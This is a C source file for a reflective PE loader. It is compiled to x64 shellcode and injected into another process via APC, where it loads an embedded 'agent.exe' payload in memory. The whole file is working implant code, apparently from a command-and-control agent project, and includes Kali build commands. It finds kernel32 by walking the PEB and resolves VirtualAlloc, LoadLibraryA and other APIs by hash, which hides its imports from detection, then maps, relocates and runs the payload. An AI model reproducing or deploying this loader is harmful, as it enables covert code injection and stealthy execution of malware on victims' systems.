/*
 * reflective_loader.c — Position-independent reflective PE loader (x64).
 *
 * STANDALONE compilation unit — NOT linked with the agent.
 * Compiled separately to raw shellcode and embedded as a byte array.
 *
 * When injected into a target process via APC, this shellcode:
 *   1. Finds its own base address
 *   2. Reads the PE payload offset from a header at its start
 *   3. Walks PEB to find kernel32.dll
 *   4. Resolves VirtualAlloc, LoadLibraryA, GetProcAddress, VirtualProtect
 *   5. Loads the PE: maps sections, processes relocations, resolves imports
 *   6. Calls the PE entry point
 *
 * Memory layout when injected:
 *   [0x00] E9 xx xx xx xx     ; jmp past_header (to 0x10)
 *   [0x05] 00 00 00           ; padding
 *   [0x08] DD pe_offset       ; DWORD: offset from shellcode start to PE payload
 *   [0x0C] DD pe_size         ; DWORD: PE payload size (informational)
 *   [0x10] ... loader code    ; actual reflective loader starts here
 *   [pe_offset] ...           ; PE payload (agent.exe bytes)
 *
 * Build (on Kali):
 *   x86_64-w64-mingw32-gcc -c -Os -fno-asynchronous-unwind-tables \
 *     -fno-ident -nostdlib -fno-stack-protector -fno-exceptions \
 *     -mno-red-zone -fno-jump-tables -fPIC -Wall \
 *     -o reflective_loader.o reflective_loader.c
 *   x86_64-w64-mingw32-objcopy -O binary -j .text reflective_loader.o reflective_loader.bin
 *   xxd -i reflective_loader.bin > ../include/loader_bin.h
 */

/* ═══════════════════════════════════════════════════════════════════
 *  Type definitions — no includes, everything manual for PIC
 * ═══════════════════════════════════════════════════════════════════ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned long       DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef int                 BOOL;
typedef void               *PVOID;
typedef void               *HANDLE;
typedef long                NTSTATUS;

#define NULL  ((void *)0)
#define TRUE  1
#define FALSE 0

/* ─── PE constants ─── */
#define IMAGE_DOS_SIGNATURE     0x5A4D
#define IMAGE_NT_SIGNATURE      0x00004550

#define IMAGE_DIRECTORY_ENTRY_EXPORT    0
#define IMAGE_DIRECTORY_ENTRY_IMPORT    1
#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5
#define IMAGE_DIRECTORY_ENTRY_TLS       9

#define IMAGE_REL_BASED_ABSOLUTE 0
#define IMAGE_REL_BASED_HIGH     1
#define IMAGE_REL_BASED_LOW      2
#define IMAGE_REL_BASED_HIGHLOW  3
#define IMAGE_REL_BASED_DIR64    10

#define IMAGE_ORDINAL_FLAG64    0x8000000000000000ULL

#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000
#define PAGE_READWRITE          0x04
#define PAGE_READONLY           0x02
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_WRITECOPY          0x08
#define PAGE_EXECUTE_WRITECOPY  0x80

#define IMAGE_SCN_MEM_EXECUTE   0x20000000
#define IMAGE_SCN_MEM_READ      0x40000000
#define IMAGE_SCN_MEM_WRITE     0x80000000
#define IMAGE_SCN_CNT_CODE      0x00000020

/* ─── PE structures ─── */
typedef struct {
    WORD  e_magic;
    BYTE  e_pad[58];
    DWORD e_lfanew;
} RL_DOS_HEADER;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} RL_DATA_DIRECTORY;

typedef struct {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} RL_FILE_HEADER;

typedef struct {
    WORD    Magic;
    BYTE    MajorLinkerVersion;
    BYTE    MinorLinkerVersion;
    DWORD   SizeOfCode;
    DWORD   SizeOfInitializedData;
    DWORD   SizeOfUninitializedData;
    DWORD   AddressOfEntryPoint;
    DWORD   BaseOfCode;
    QWORD   ImageBase;
    DWORD   SectionAlignment;
    DWORD   FileAlignment;
    WORD    MajorOSVersion;
    WORD    MinorOSVersion;
    WORD    MajorImageVersion;
    WORD    MinorImageVersion;
    WORD    MajorSubsystemVersion;
    WORD    MinorSubsystemVersion;
    DWORD   Win32VersionValue;
    DWORD   SizeOfImage;
    DWORD   SizeOfHeaders;
    DWORD   CheckSum;
    WORD    Subsystem;
    WORD    DllCharacteristics;
    QWORD   SizeOfStackReserve;
    QWORD   SizeOfStackCommit;
    QWORD   SizeOfHeapReserve;
    QWORD   SizeOfHeapCommit;
    DWORD   LoaderFlags;
    DWORD   NumberOfRvaAndSizes;
    RL_DATA_DIRECTORY DataDirectory[16];
} RL_OPTIONAL_HEADER64;

typedef struct {
    DWORD            Signature;
    RL_FILE_HEADER   FileHeader;
    RL_OPTIONAL_HEADER64 OptionalHeader;
} RL_NT_HEADERS64;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} RL_SECTION_HEADER;

typedef struct {
    union {
        DWORD Characteristics;
        DWORD OriginalFirstThunk;
    };
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;
    DWORD FirstThunk;
} RL_IMPORT_DESCRIPTOR;

typedef struct {
    DWORD VirtualAddress;
    DWORD SizeOfBlock;
} RL_BASE_RELOCATION;

/* ─── PEB structures ─── */
typedef struct _RL_UNICODE_STRING {
    WORD  Length;
    WORD  MaximumLength;
    DWORD _pad;
    QWORD Buffer;
} RL_UNICODE_STRING;

typedef struct _RL_LIST_ENTRY {
    QWORD Flink;
    QWORD Blink;
} RL_LIST_ENTRY;

/* ─── Function pointer types ─── */
typedef PVOID  (__attribute__((ms_abi)) *fn_VirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (__attribute__((ms_abi)) *fn_VirtualProtect)(PVOID, SIZE_T, DWORD, DWORD *);
typedef PVOID  (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
typedef PVOID  (__attribute__((ms_abi)) *fn_GetProcAddress)(PVOID, const char *);
typedef BOOL   (__attribute__((ms_abi)) *fn_FlushIC)(HANDLE, PVOID, SIZE_T);
typedef void   (__attribute__((ms_abi)) *fn_Entry)(void);

/* ═══════════════════════════════════════════════════════════════════
 *  DJB2 hash — matches the agent's api_hash() for consistency
 * ═══════════════════════════════════════════════════════════════════ */

static __attribute__((always_inline)) DWORD _rl_hash(const char *s) {
    DWORD h = 5381;
    while (*s) {
        h = ((h << 5) + h) + (BYTE)*s;
        s++;
    }
    return h;
}

static __attribute__((always_inline)) DWORD _rl_hash_w_ci(const WORD *s, WORD lenBytes) {
    DWORD h = 5381;
    WORD n = lenBytes / 2;
    for (WORD i = 0; i < n; i++) {
        WORD c = s[i];
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + (DWORD)(c & 0xFF);
    }
    return h;
}

/* Pre-computed hashes (DJB2, case-sensitive for functions) */
#define RL_H_KERNEL32           0x7040EE75u
#define RL_H_VIRTUALALLOC       0x382C0F97u
#define RL_H_VIRTUALPROTECT     0x844FF18Du
#define RL_H_LOADLIBRARYA       0x5FBFF0FBu
#define RL_H_GETPROCADDRESS     0xCF31BB1Fu
#define RL_H_FLUSHINSTRUCTIONCACHE 0xB7DCEDDDu

/* ═══════════════════════════════════════════════════════════════════
 *  PEB walk → find module by hash → resolve export by hash
 * ═══════════════════════════════════════════════════════════════════ */

static __attribute__((always_inline)) PVOID _rl_get_peb(void) {
    PVOID peb;
    __asm__ __volatile__("mov %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static __attribute__((always_inline)) PVOID _rl_resolve_export(
        BYTE *base, DWORD funcHash) {
    RL_DOS_HEADER *dos = (RL_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    RL_NT_HEADERS64 *nt = (RL_NT_HEADERS64 *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD expRVA  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (expRVA == 0) return NULL;

    /* IMAGE_EXPORT_DIRECTORY inline (avoid struct dependency) */
    BYTE *expDir = base + expRVA;
    DWORD numNames  = *(DWORD *)(expDir + 24);
    DWORD *nameRVAs = (DWORD *)(base + *(DWORD *)(expDir + 32));
    WORD  *ordinals = (WORD  *)(base + *(DWORD *)(expDir + 36));
    DWORD *funcRVAs = (DWORD *)(base + *(DWORD *)(expDir + 28));

    for (DWORD i = 0; i < numNames; i++) {
        const char *name = (const char *)(base + nameRVAs[i]);
        if (_rl_hash(name) == funcHash) {
            DWORD fRVA = funcRVAs[ordinals[i]];
            /* Skip forwarded exports */
            if (fRVA >= expRVA && fRVA < expRVA + expSize)
                return NULL;
            return (PVOID)(base + fRVA);
        }
    }
    return NULL;
}

static __attribute__((always_inline)) PVOID _rl_find_module(DWORD modHash) {
    BYTE *peb = (BYTE *)_rl_get_peb();
    if (!peb) return NULL;

    /* PEB + 0x18 → Ldr */
    BYTE *ldr = *(BYTE **)(peb + 0x18);
    if (!ldr) return NULL;

    /* PEB_LDR_DATA + 0x20 → InMemoryOrderModuleList (head) */
    RL_LIST_ENTRY *head = (RL_LIST_ENTRY *)(ldr + 0x20);
    RL_LIST_ENTRY *cur  = (RL_LIST_ENTRY *)head->Flink;

    while ((QWORD)cur != (QWORD)head) {
        /*
         * InMemoryOrderLinks is at offset 0x10 in LDR_DATA_TABLE_ENTRY.
         * cur points to InMemoryOrderLinks, so:
         *   DllBase        = cur - 0x10 + 0x30 = cur + 0x20
         *   BaseDllName    = cur - 0x10 + 0x58 = cur + 0x48
         */
        BYTE *entry = (BYTE *)cur;
        PVOID dllBase = *(PVOID *)(entry + 0x20);
        WORD  nameLen = *(WORD  *)(entry + 0x48);
        WORD *nameBuf = *(WORD **)(entry + 0x50);

        if (dllBase && nameBuf && nameLen > 0) {
            if (_rl_hash_w_ci(nameBuf, nameLen) == modHash)
                return dllBase;
        }

        cur = (RL_LIST_ENTRY *)cur->Flink;
    }
    return NULL;
}

static __attribute__((always_inline)) PVOID _rl_resolve(
        DWORD modHash, DWORD funcHash) {
    PVOID mod = _rl_find_module(modHash);
    if (!mod) return NULL;
    return _rl_resolve_export((BYTE *)mod, funcHash);
}

/* ═══════════════════════════════════════════════════════════════════
 *  Inline memcpy/memset (no libc)
 * ═══════════════════════════════════════════════════════════════════ */

static __attribute__((always_inline)) void _rl_memcpy(void *dst, const void *src, SIZE_T n) {
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
}

static __attribute__((always_inline)) void _rl_memset(void *dst, BYTE val, SIZE_T n) {
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = val;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Section protection mapping
 * ═══════════════════════════════════════════════════════════════════ */

static __attribute__((always_inline)) DWORD _rl_section_prot(DWORD chars) {
    BOOL x = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL w = (chars & IMAGE_SCN_MEM_WRITE)   != 0;
    BOOL r = (chars & IMAGE_SCN_MEM_READ)    != 0;

    if (x && w && r) return PAGE_EXECUTE_READWRITE;
    if (x && w)      return PAGE_EXECUTE_WRITECOPY;
    if (x && r)      return PAGE_EXECUTE_READ;
    if (x)           return PAGE_EXECUTE_READ;
    if (w && r)      return PAGE_READWRITE;
    if (w)           return PAGE_WRITECOPY;
    if (r)           return PAGE_READONLY;
    return PAGE_READONLY;
}

/* ═══════════════════════════════════════════════════════════════════
 *  ENTRY POINT — called via APC in the target process
 *
 *  The injector prepends a 16-byte header before this code:
 *    [0x00] E9 xx xx xx xx   jmp to 0x10 (skip header)
 *    [0x05] 00 00 00         padding
 *    [0x08] DWORD pe_offset  offset from start to PE payload
 *    [0x0C] DWORD pe_size    PE payload size
 *    [0x10] ... this code
 *
 *  But since this is compiled separately and the header is prepended
 *  by the injector at runtime, the entry below IS offset 0x00 of the
 *  compiled shellcode. The injector handles the header.
 * ═══════════════════════════════════════════════════════════════════ */

/* APC callback signature: void NTAPI callback(ULONG_PTR param) */
__attribute__((section(".text"), ms_abi))
void reflective_loader_entry(QWORD apc_param) {
    /*
     * apc_param = base address of the injection buffer (set by injector).
     * Layout:  [16-byte header] [this shellcode] [PE payload]
     * The PE offset is at base+8.
     */
    BYTE *bufBase = (BYTE *)apc_param;
    DWORD peOffset = *(DWORD *)(bufBase + 8);
    BYTE *peRaw = bufBase + peOffset;

    /* ── 1. Resolve kernel32 APIs ── */
    fn_VirtualAlloc   pVirtualAlloc   = (fn_VirtualAlloc)  _rl_resolve(RL_H_KERNEL32, RL_H_VIRTUALALLOC);
    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)_rl_resolve(RL_H_KERNEL32, RL_H_VIRTUALPROTECT);
    fn_LoadLibraryA   pLoadLibraryA   = (fn_LoadLibraryA)  _rl_resolve(RL_H_KERNEL32, RL_H_LOADLIBRARYA);
    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)_rl_resolve(RL_H_KERNEL32, RL_H_GETPROCADDRESS);
    fn_FlushIC        pFlushIC        = (fn_FlushIC)       _rl_resolve(RL_H_KERNEL32, RL_H_FLUSHINSTRUCTIONCACHE);

    if (!pVirtualAlloc || !pLoadLibraryA || !pGetProcAddress) return;

    /* ── 2. Parse PE headers ── */
    RL_DOS_HEADER *dos = (RL_DOS_HEADER *)peRaw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    RL_NT_HEADERS64 *nt = (RL_NT_HEADERS64 *)(peRaw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    DWORD sizeOfImage   = nt->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    QWORD preferredBase = nt->OptionalHeader.ImageBase;
    DWORD entryRVA      = nt->OptionalHeader.AddressOfEntryPoint;
    WORD  numSections   = nt->FileHeader.NumberOfSections;

    /* ── 3. Allocate memory for the PE image ── */
    /* Try preferred base first for fewer relocations */
    BYTE *imageBase = (BYTE *)pVirtualAlloc(
        (PVOID)preferredBase, (SIZE_T)sizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!imageBase) {
        /* Preferred base taken — allocate anywhere */
        imageBase = (BYTE *)pVirtualAlloc(
            NULL, (SIZE_T)sizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!imageBase) return;

    /* ── 4. Copy PE headers ── */
    _rl_memcpy(imageBase, peRaw, sizeOfHeaders);

    /* ── 5. Copy sections ── */
    RL_SECTION_HEADER *sections = (RL_SECTION_HEADER *)(
        (BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for (WORD i = 0; i < numSections; i++) {
        if (sections[i].SizeOfRawData == 0) continue;
        _rl_memcpy(
            imageBase + sections[i].VirtualAddress,
            peRaw + sections[i].PointerToRawData,
            sections[i].SizeOfRawData);
    }

    /* ── 6. Process base relocations ── */
    QWORD delta = (QWORD)imageBase - preferredBase;
    if (delta != 0) {
        RL_DATA_DIRECTORY *relocDir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir->VirtualAddress && relocDir->Size) {
            RL_BASE_RELOCATION *reloc =
                (RL_BASE_RELOCATION *)(imageBase + relocDir->VirtualAddress);
            BYTE *relocEnd = (BYTE *)reloc + relocDir->Size;

            while ((BYTE *)reloc < relocEnd && reloc->SizeOfBlock >= 8) {
                DWORD blockRVA = reloc->VirtualAddress;
                DWORD numEntries = (reloc->SizeOfBlock - 8) / 2;
                WORD *entries = (WORD *)((BYTE *)reloc + 8);

                for (DWORD j = 0; j < numEntries; j++) {
                    WORD type   = entries[j] >> 12;
                    WORD offset = entries[j] & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        QWORD *patchAddr = (QWORD *)(imageBase + blockRVA + offset);
                        *patchAddr += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD *patchAddr = (DWORD *)(imageBase + blockRVA + offset);
                        *patchAddr += (DWORD)delta;
                    } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
                        /* Padding — skip */
                    }
                }

                reloc = (RL_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* ── 7. Resolve imports ── */
    RL_DATA_DIRECTORY *importDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (importDir->VirtualAddress && importDir->Size) {
        RL_IMPORT_DESCRIPTOR *imp =
            (RL_IMPORT_DESCRIPTOR *)(imageBase + importDir->VirtualAddress);

        while (imp->Name != 0) {
            const char *dllName = (const char *)(imageBase + imp->Name);
            PVOID hDll = pLoadLibraryA(dllName);
            if (!hDll) { imp++; continue; }

            QWORD *origThunk = imp->OriginalFirstThunk
                ? (QWORD *)(imageBase + imp->OriginalFirstThunk)
                : (QWORD *)(imageBase + imp->FirstThunk);
            QWORD *iatEntry  = (QWORD *)(imageBase + imp->FirstThunk);

            while (*origThunk) {
                if (*origThunk & IMAGE_ORDINAL_FLAG64) {
                    /* Import by ordinal */
                    WORD ordinal = (WORD)(*origThunk & 0xFFFF);
                    *iatEntry = (QWORD)pGetProcAddress(hDll, (const char *)(ULONG_PTR)ordinal);
                } else {
                    /* Import by name — skip 2-byte hint */
                    const char *funcName = (const char *)(imageBase + (DWORD)*origThunk + 2);
                    *iatEntry = (QWORD)pGetProcAddress(hDll, funcName);
                }
                origThunk++;
                iatEntry++;
            }

            imp++;
        }
    }

    /* ── 8. Set section memory protections ── */
    if (pVirtualProtect) {
        for (WORD i = 0; i < numSections; i++) {
            if (sections[i].VirtualSize == 0) continue;
            DWORD prot = _rl_section_prot(sections[i].Characteristics);
            DWORD oldProt = 0;
            pVirtualProtect(
                imageBase + sections[i].VirtualAddress,
                sections[i].VirtualSize,
                prot, &oldProt);
        }
    }

    /* ── 9. Flush instruction cache ── */
    if (pFlushIC) {
        pFlushIC((HANDLE)-1, imageBase, sizeOfImage);
    }

    /* ── 10. Call PE entry point ── */
    fn_Entry entry = (fn_Entry)(imageBase + entryRVA);
    entry();

    /* If we reach here, the PE's main() returned. */
}
